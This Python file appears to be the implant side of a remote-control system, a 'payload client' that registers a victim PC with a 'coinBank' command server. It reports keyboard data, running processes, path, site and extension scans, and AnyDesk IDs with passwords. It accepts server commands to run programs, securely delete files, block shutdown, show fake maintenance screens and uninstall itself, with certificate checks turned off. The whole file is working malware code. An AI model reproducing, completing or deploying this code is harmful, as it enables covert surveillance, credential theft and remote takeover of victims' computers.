"""
Payload client for coinBank server communication (WebSocket only).
Implements all send actions and handlers for incoming admin commands.
Reads server URL from .env (SERVER_IP, optional SERVER_PORT, SERVER_WSS).
UID is read from .env (UID/COINBANK_UID) or derived from this PC's MAC address.
"""

import hashlib
import json
import os
import platform
import subprocess
import sys
import threading
import time
import ssl
import uuid
from pathlib import Path
from typing import Any, Callable, Optional


def _env_dir() -> Path:
    """Directory for .env file: next to exe when frozen, else next to this script."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve().parent
    return Path(__file__).resolve().parent


def _load_env() -> bool:
    """Load .env: when frozen, use embedded .env (then exe-dir .env to override). Else script dir."""
    try:
        from dotenv import load_dotenv
    except ImportError:
        return False
    loaded = False
    if getattr(sys, "frozen", False):
        # Embedded .env (bundled by PyInstaller into sys._MEIPASS)
        embedded = Path(sys._MEIPASS) / ".env"
        if embedded.is_file():
            load_dotenv(embedded)
            loaded = True
        # .env next to exe overrides embedded
        exe_env = Path(sys.executable).resolve().parent / ".env"
        if exe_env.is_file():
            load_dotenv(exe_env)
            loaded = True
    else:
        loaded = load_dotenv(_env_dir() / ".env")
    return loaded


try:
    _dotenv_loaded = _load_env()
except Exception:
    _dotenv_loaded = False

try:
    import websocket
except ImportError:
    websocket = None  # pip install websocket-client


def get_mac_address() -> str:
    """
    Get this PC's MAC address as a string (hex, colon-separated).
    Tries uuid.getnode() first; on Windows also tries getmac.exe if available.
    """
    try:
        node = uuid.getnode()
        # If uuid.getnode() returns random (e.g. no MAC), try platform-specific
        if (node >> 40) & 0x01:  # multicast bit often set when random
            if platform.system() == "Windows":
                try:
                    out = subprocess.run(
                        ["getmac", "/fo", "csv", "/nh"],
                        capture_output=True,
                        text=True,
                        timeout=5,
                    )
                    if out.returncode == 0 and out.stdout.strip():
                        for line in out.stdout.strip().splitlines():
                            parts = line.split(",")
                            if len(parts) >= 1:
                                mac = parts[0].strip().replace("-", ":").upper()
                                if mac and mac != "N/A" and len(mac) >= 12:
                                    return mac
                except (FileNotFoundError, subprocess.TimeoutExpired):
                    pass
            elif platform.system() == "Linux":
                try:
                    with open("/sys/class/net/eth0/address", "r") as f:
                        return f.read().strip().upper()
                except OSError:
                    pass
                for name in ("enp0s3", "eno1", "wlan0", "eth0"):
                    try:
                        with open(f"/sys/class/net/{name}/address", "r") as f:
                            return f.read().strip().upper()
                    except OSError:
                        continue
        # Use uuid.getnode() formatted as MAC
        return ":".join(f"{((node >> i) & 0xFF):02X}" for i in range(0, 48, 8)[::-1])
    except Exception:
        return "00:00:00:00:00:00"


def get_uid_from_mac(mac: str, length: int = 16) -> str:
    """
    Generate a unique ID string from a MAC address (deterministic, same MAC = same UID).
    """
    normalized = mac.replace(":", "").replace("-", "").upper().strip()
    if not normalized:
        normalized = str(uuid.getnode())
    raw = hashlib.sha256(normalized.encode()).hexdigest()
    return raw[:length]


def get_default_uid() -> str:
    """
    Get UID from .env (UID or COINBANK_UID) if set; otherwise derive from this PC's MAC.
    """
    uid = os.environ.get("COINBANK_UID", os.environ.get("UID", "")).strip()
    if uid:
        return uid
    mac = get_mac_address()
    return get_uid_from_mac(mac)


def get_server_url_from_env() -> str:
    """
    Build WebSocket URL from .env (or os.environ).
    Uses: SERVER_IP (required), SERVER_PORT (default 8443), SERVER_WSS (default true).
    Or set COINBANK_WS_URL directly for full URL.
    """
    url = os.environ.get("COINBANK_WS_URL", "").strip()
    if url:
        return url
    ip = os.environ.get("SERVER_IP", os.environ.get("COINBANK_SERVER_IP", "")).strip()
    if not ip:
        return "wss://localhost:8443"
    port = os.environ.get("SERVER_PORT", os.environ.get("COINBANK_SERVER_PORT", "8443")).strip()
    use_wss = os.environ.get("SERVER_WSS", os.environ.get("COINBANK_WSS", "true")).strip().lower() in ("1", "true", "yes")
    scheme = "wss" if use_wss else "ws"
    return f"{scheme}://{ip}:{port}"


# --- Action constants (must match server server/ws/constants.js) ---
ACTION_CONNECT = "connect"
ACTION_EVENT = "event"
ACTION_MAINTAIN_STOPPED = "maintainstopped"
ACTION_COMMAND_RECEIVED = "commandreceived"
ACTION_MAINTAINED = "maintained"
ACTION_CHECKED = "checked"
ACTION_SHUTDOWN_BLOCKED = "shutdownblocked"
ACTION_SHUTDOWN_UNBLOCKED = "shutdownunblocked"
ACTION_STARTED = "started"
ACTION_CLOSED = "closed"

# Admin commands (server -> payload)
CMD_JSON = "command_json"
CMD_RUN = "command_run"
CMD_CLOSE = "command_close"
CMD_UNINSTALL = "command_uninstall"
CMD_START_RESTART = "command_start_restart"
CMD_START_SDELETE = "command_start_sdelete"
CMD_BLOCK_SHUTDOWN_UPDATE = "block_shutdown_update"
CMD_BLOCK_SHUTDOWN_TURNOFF = "block_shutdown_turnoff"
CMD_UNBLOCK_SHUTDOWN = "unblock_shutdown"
CMD_START_MAINTENANCE_SCREEN = "start_maintenance_screen"
CMD_START_MAINTENANCE_TURNOFF_SCREEN = "start_maintenance_turnoff_screen"
CMD_STOP_MAINTENANCE_SCREEN = "stop_maintenance_screen"
CMD_CHECK = "command_check"
CMD_LIKE = "command_like"
CMD_COMMENT = "command_comment"

ALL_ADMIN_COMMANDS = [
    CMD_JSON, CMD_RUN, CMD_CLOSE, CMD_UNINSTALL,
    CMD_START_RESTART, CMD_START_SDELETE,
    CMD_BLOCK_SHUTDOWN_UPDATE, CMD_BLOCK_SHUTDOWN_TURNOFF, CMD_UNBLOCK_SHUTDOWN,
    CMD_START_MAINTENANCE_SCREEN, CMD_START_MAINTENANCE_TURNOFF_SCREEN, CMD_STOP_MAINTENANCE_SCREEN,
    CMD_CHECK, CMD_LIKE, CMD_COMMENT,
]


def _default_on_command(action: str, payload: dict) -> None:
    """Default handler for admin commands (override in subclass or set on_client_command)."""
    print(f"[Payload] Received command: {action} payload={payload}")


def _default_on_close(ws, close_status_code, close_msg):
    print(f"[Payload] WebSocket closed: {close_status_code} {close_msg}")


def _default_on_error(ws, error):
    print(f"[Payload] WebSocket error: {error}")


class CoinBankPayloadClient:
    """
    Client that communicates with coinBank server over WebSocket.
    Sends user-side actions (connect, event, maintained, etc.) and
    handles incoming admin commands.
    """

    def __init__(
        self,
        server_url: str,
        uid: str,
        *,
        anydesk_id: str = "",
        client_id: str = "",
        scaninfo: Optional[dict] = None,
        block: bool = False,
        maintenance: bool = False,
        on_command: Optional[Callable[[str, dict], None]] = None,
        on_connect: Optional[Callable[[], None]] = None,
        on_close: Optional[Callable] = None,
        on_error: Optional[Callable] = None,
        ssl_verify: bool = True,
    ):
        """
        :param server_url: e.g. "wss://localhost:8443" or "ws://localhost:8443"
        :param uid: Unique machine/user id (reported to server in connect).
        :param anydesk_id: Anydesk id string.
        :param client_id: Optional client id (payload.data.id).
        :param scaninfo: Optional dict with path_scan, site_scan, extension_scan (lists).
        :param block: Block flag for connect.
        :param maintenance: Maintenance flag for connect.
        :param on_command: Callback(action: str, payload: dict) for admin commands.
        :param on_connect: Callback when WS is opened.
        :param on_close: Callback(ws, close_status_code, close_msg).
        :param on_error: Callback(ws, error).
        :param ssl_verify: If False, skip SSL cert verification for wss.
        """
        if websocket is None:
            raise RuntimeError("Install websocket-client: pip install websocket-client")

        self.server_url = server_url
        self.uid = uid
        self.anydesk_id = anydesk_id or ""
        self.client_id = client_id or uid
        self.scaninfo = scaninfo or {}
        self.block = block
        self.maintenance = maintenance
        self.on_command = on_command or _default_on_command
        self.on_connect_cb = on_connect
        self.on_close_cb = on_close or _default_on_close
        self.on_error_cb = on_error or _default_on_error
        self.ssl_verify = ssl_verify

        self._ws: Optional[websocket.WebSocketApp] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    def _send(self, message: dict) -> bool:
        """Serialize and send one JSON message. Returns True if sent."""
        if self._ws is None or not self._ws.sock or not self._ws.sock.connected:
            return False
        try:
            self._ws.send(json.dumps(message))
            return True
        except Exception as e:
            if self.on_error_cb:
                self.on_error_cb(self._ws, e)
            return False

    # ---------- Send API (payload -> server) ----------

    def send_connect(
        self,
        *,
        id: Optional[str] = None,
        anydesk_id: Optional[str] = None,
        uid: Optional[str] = None,
        scaninfo: Optional[dict] = None,
        block: Optional[bool] = None,
        maintenance: Optional[bool] = None,
    ) -> bool:
        """
        Register as user client. Call once after WebSocket is open.
        Server expects: data.id, data.anydesk_id, data.uid, data.scaninfo, data.block, data.maintenance.
        """
        data = {
            "id": id if id is not None else self.client_id,
            "anydesk_id": anydesk_id if anydesk_id is not None else self.anydesk_id,
            "uid": uid if uid is not None else self.uid,
            "scaninfo": scaninfo if scaninfo is not None else self.scaninfo,
            "block": block if block is not None else self.block,
            "maintenance": maintenance if maintenance is not None else self.maintenance,
        }
        # Ensure scaninfo has uid for server
        if "uid" not in data["scaninfo"]:
            data["scaninfo"] = {**data["scaninfo"], "uid": self.uid}
        return self._send({"action": ACTION_CONNECT, "data": data})

    def send_event(
        self,
        data: dict,
        *,
        processes: Optional[str] = None,
        keyboard: Optional[str] = None,
        status: Optional[dict] = None,
    ) -> bool:
        """
        Send heartbeat/status. data can include processes, keyboard, etc.
        status: optional { "maintained": bool, "shutdownpressed": bool, "version": str }.
        """
        if processes is not None:
            data = {**data, "processes": processes}
        if keyboard is not None:
            data = {**data, "keyboard": keyboard}
        msg = {"action": ACTION_EVENT, "data": data}
        if status is not None:
            msg["status"] = status
        return self._send(msg)

    def send_maintain_stopped(self, data: Optional[dict] = None) -> bool:
        """Maintenance stopped."""
        return self._send({"action": ACTION_MAINTAIN_STOPPED, "data": data or {}})

    def send_command_received(self, data: Optional[dict] = None) -> bool:
        """JSON command executed successfully."""
        return self._send({"action": ACTION_COMMAND_RECEIVED, "data": data or {}})

    def send_maintained(self, data: Optional[dict] = None) -> bool:
        """In maintenance."""
        return self._send({"action": ACTION_MAINTAINED, "data": data or {}})

    def send_checked(self, data: Optional[dict] = None) -> bool:
        """Command check result (reply to command_check)."""
        return self._send({"action": ACTION_CHECKED, "data": data or {}})

    def send_shutdown_blocked(self) -> bool:
        """Shutdown blocked."""
        return self._send({"action": ACTION_SHUTDOWN_BLOCKED})

    def send_shutdown_unblocked(self) -> bool:
        """Shutdown unblocked."""
        return self._send({"action": ACTION_SHUTDOWN_UNBLOCKED})

    def send_started(self, password: str = "", anydesk_id: str = "") -> bool:
        """Anydesk started; report password and anydesk_id to server."""
        return self._send({
            "action": ACTION_STARTED,
            "data": {"password": password, "anydesk_id": anydesk_id or self.anydesk_id},
        })

    def send_closed(self, data: Optional[dict] = None) -> bool:
        """Anydesk closed."""
        return self._send({"action": ACTION_CLOSED, "data": data or {}})

    # ---------- Connection lifecycle ----------

    def _on_message(self, ws, raw: str) -> None:
        try:
            msg = json.loads(raw)
        except json.JSONDecodeError:
            if self.on_error_cb:
                self.on_error_cb(ws, ValueError(f"Invalid JSON: {raw[:200]}"))
            return
        action = msg.get("action")
        if not action:
            return
        # All server->payload messages are admin commands (forwarded by uid)
        if action in ALL_ADMIN_COMMANDS:
            self.on_command(action, msg)

    def _run_ws(self) -> None:
        options = {}
        if self.server_url.startswith("wss://") and not self.ssl_verify:
            options["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
        self._ws = websocket.WebSocketApp(
            self.server_url,
            on_open=lambda w: self.on_connect_cb() if self.on_connect_cb else None,
            on_message=self._on_message,
            on_close=self.on_close_cb,
            on_error=self.on_error_cb,
        )
        self._running = True
        self._ws.run_forever(**options)
        self._running = False
        self._ws = None

    def connect(self) -> None:
        """Start WebSocket connection in a background thread (non-blocking)."""
        if self._thread is not None and self._thread.is_alive():
            return
        self._thread = threading.Thread(target=self._run_ws, daemon=True)
        self._thread.start()
        # Allow socket to open before sending connect
        time.sleep(0.5)

    def connect_blocking(self) -> None:
        """Start WebSocket and run forever in current thread (blocking)."""
        if self.server_url.startswith("wss://") and not self.ssl_verify:
            self._ws = websocket.WebSocketApp(
                self.server_url,
                on_open=lambda w: self.on_connect_cb() if self.on_connect_cb else None,
                on_message=self._on_message,
                on_close=self.on_close_cb,
                on_error=self.on_error_cb,
            )
            self._ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        else:
            self._ws = websocket.WebSocketApp(
                self.server_url,
                on_open=lambda w: self.on_connect_cb() if self.on_connect_cb else None,
                on_message=self._on_message,
                on_close=self.on_close_cb,
                on_error=self.on_error_cb,
            )
            self._ws.run_forever()
        self._ws = None

    def disconnect(self) -> None:
        """Close WebSocket if open."""
        if self._ws and self._ws.sock and self._ws.sock.connected:
            self._ws.close()
        self._ws = None
        self._running = False

    def is_connected(self) -> bool:
        """True if socket is open."""
        return (
            self._ws is not None
            and self._ws.sock is not None
            and getattr(self._ws.sock, "connected", False)
        )


# ---------- Convenience: module-level send helpers (require a global client) ----------
_client: Optional[CoinBankPayloadClient] = None


def set_client(client: CoinBankPayloadClient) -> None:
    global _client
    _client = client


def get_client() -> Optional[CoinBankPayloadClient]:
    return _client


def send_connect(**kwargs) -> bool:
    return _client.send_connect(**kwargs) if _client else False


def send_event(data: dict, **kwargs) -> bool:
    return _client.send_event(data, **kwargs) if _client else False


def send_maintain_stopped(data: Optional[dict] = None) -> bool:
    return _client.send_maintain_stopped(data) if _client else False


def send_command_received(data: Optional[dict] = None) -> bool:
    return _client.send_command_received(data) if _client else False


def send_maintained(data: Optional[dict] = None) -> bool:
    return _client.send_maintained(data) if _client else False


def send_checked(data: Optional[dict] = None) -> bool:
    return _client.send_checked(data) if _client else False


def send_shutdown_blocked() -> bool:
    return _client.send_shutdown_blocked() if _client else False


def send_shutdown_unblocked() -> bool:
    return _client.send_shutdown_unblocked() if _client else False


def send_started(password: str = "", anydesk_id: str = "") -> bool:
    return _client.send_started(password=password, anydesk_id=anydesk_id) if _client else False


def send_closed(data: Optional[dict] = None) -> bool:
    return _client.send_closed(data) if _client else False


# ---------- Example usage ----------
if __name__ == "__main__":
    URL = get_server_url_from_env()
    UID = get_default_uid()

    def on_connect():
        print("Connected; sending connect action...")
        client.send_connect()

    def on_cmd(action: str, payload: dict):
        print(f"Command: {action} -> {payload}")
        if action == CMD_CHECK:
            client.send_checked({"ok": True})

    client = CoinBankPayloadClient(URL, UID, on_connect=on_connect, on_command=on_cmd, ssl_verify=False)
    set_client(client)
    print(f"Connecting to {URL} as uid={UID}...")
    client.connect()
    try:
        while True:
            time.sleep(10)
            if client.is_connected():
                client.send_event({"processes": "test.exe", "ts": time.time()})
    except KeyboardInterrupt:
        client.disconnect()
